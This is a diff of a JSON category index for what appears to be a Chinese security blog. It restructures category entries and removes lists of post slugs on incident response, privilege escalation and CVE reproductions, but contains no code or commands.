-        "reconinspector-yi-kuan-ji-fofa-nuclei-yu-pocmo-ban-diao-shi-yu-yi-ti-de-ke-shi-hua-an-quan-xun-jian-ping-tai"
-      ],
-      "page": 1
+      "slug": "工具使用",
+      "title": "工具使用",
+      "parent": "",
+      "order": 0
     },
     "应急响应": {
-      "dir_name": "应急响应",
-      "posts": [
-        "1.webru-qin-cha-sha-zhi-nan",
-        "2.c2hou-men-fa-xian-yu-chu-zhi",
-        "3.wa-kuang-bing-du-pai-cha-fen-xi",
-        "4.diao-yu-you-jian-fen-xi-yu-pai-cha",
-        "5.mi-ma-bao-po-ri-zhi-fen-xi-yu-sui-dao-liu-liang-jian-cha",
-        "an-quan-she-bei-hidsji-yu-zhu-ji-de-ru-qin-jian-ce-xi-tong",
-        "an-quan-she-bei-nidsru-qin-jian-ce-xi-tong"
-      ],
-      "page": 1
+      "slug": "应急响应",
+      "title": "应急响应",
+      "parent": "",
+      "order": 0
     },
     "护网": {
-      "dir_name": "护网",
-      "posts": [
-        "护网面经"
-      ],
-      "page": 1
+      "slug": "护网",
+      "title": "护网",
+      "parent": "",
+      "order": 0
     },
     "权限提升": {
-      "dir_name": "权限提升",
-      "posts": [
-        "linux",
-        "windows"
-      ],
-      "page": 1
+      "slug": "权限提升",
+      "title": "权限提升",
+      "parent": "",
+      "order": 0
     },
     "漏洞复现": {
-      "dir_name": "漏洞复现",
-      "posts": [
-        "7ziplou-dong-fu-xian-he-ji",
-        "apache-solr-rcelou-dong-fu-xian",
-        "apache-struts2-ognl-rcezhu-ru",
-        "apache_shiro-cve-2016-4437-fan-xu-lie-hua-lou-dong-fu-xian",
-        "cve-2025-55182de-fu-xian-yu-xiu-fu",
-        "cve-2025-55725",
-        "cve-2025-8088-winrar",
-        "cve-2026-24061-telnetyuan-cheng-ren-zheng-rao-guo",
-        "fastjsonfan-xu-lie-hua-lou-dong-1.2.24ban-ben",
-        "log4j2-cve-2021-44228lou-dong-fu-xian",
-        "mongodblou-dong-fu-xian-cve-2025-14847",
-        "redis-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2025-49844",
-        "spring4shell-cve-2022-22965yuan-li-ji-fu-xian"
-      ],
-      "page": 1
+      "slug": "漏洞复现",
+      "title": "漏洞复现",
+      "parent": "",
+      "order": 0
+    },
+    "list/drafts": {
+      "slug": "list/drafts",
+      "title": "drafts",
+      "parent": "list",
+      "order": 12
     }
   }
 }
